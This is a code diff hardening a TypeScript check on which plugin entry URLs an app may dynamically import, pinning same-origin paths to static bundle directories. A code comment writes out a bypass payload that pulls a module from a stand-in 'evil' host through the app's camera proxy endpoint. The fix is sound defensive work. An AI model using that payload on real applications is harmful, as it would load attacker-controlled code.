@@ -26,9 +26,21 @@ const LOCAL_ENTRY_HOSTS = ["localhost", "127.0.0.1"];
 
 /**
  * A sentinel origin used only to resolve a relative entry the same way a browser
- * would. It is never fetched; only the resulting origin is inspected.
+ * would. It is never fetched; only the resulting origin and path are inspected.
  */
-const RESOLUTION_BASE = "https://app.invalid/_next/static/chunks/";
+const RESOLUTION_BASE = "https://app.invalid/";
+
+/**
+ * Same-origin paths a plugin bundle may be served from.
+ *
+ * Being same-origin is NOT on its own enough to be safe: this app also serves
+ * `/api/camera/proxy/*`, which streams a remote body back under the caller's
+ * chosen content type. `import("/api/camera/proxy/iframe?url=https://evil/x.js")`
+ * is same-origin, so a bare origin check would have handed an attacker a module
+ * on this origin. Bundles only ever come from static files under /public, so the
+ * relative branch is pinned to those directories.
+ */
+const ALLOWED_ENTRY_PATH_PREFIXES = ["/plugins/", "/plugins-local/", "/e2e-fixtures/"];
 
 /**
  * Whether a manifest entry may be dynamically imported.
@@ -50,8 +62,11 @@ export function isAllowedEntryUrl(entry: string): boolean {
         return false;
     }
 
-    // Resolved back onto the sentinel: a genuinely same-origin relative path.
-    if (resolved.origin === new URL(RESOLUTION_BASE).origin) return true;
+    // Resolved back onto the sentinel: a genuinely same-origin path. Allowed only
+    // under a static bundle directory — see ALLOWED_ENTRY_PATH_PREFIXES.
+    if (resolved.origin === new URL(RESOLUTION_BASE).origin) {
+        return ALLOWED_ENTRY_PATH_PREFIXES.some((prefix) => resolved.pathname.startsWith(prefix));
+    }
 
     if (resolved.protocol === "http:" && LOCAL_ENTRY_HOSTS.includes(resolved.hostname)) return true;
     if (resolved.protocol !== "https:") return false;
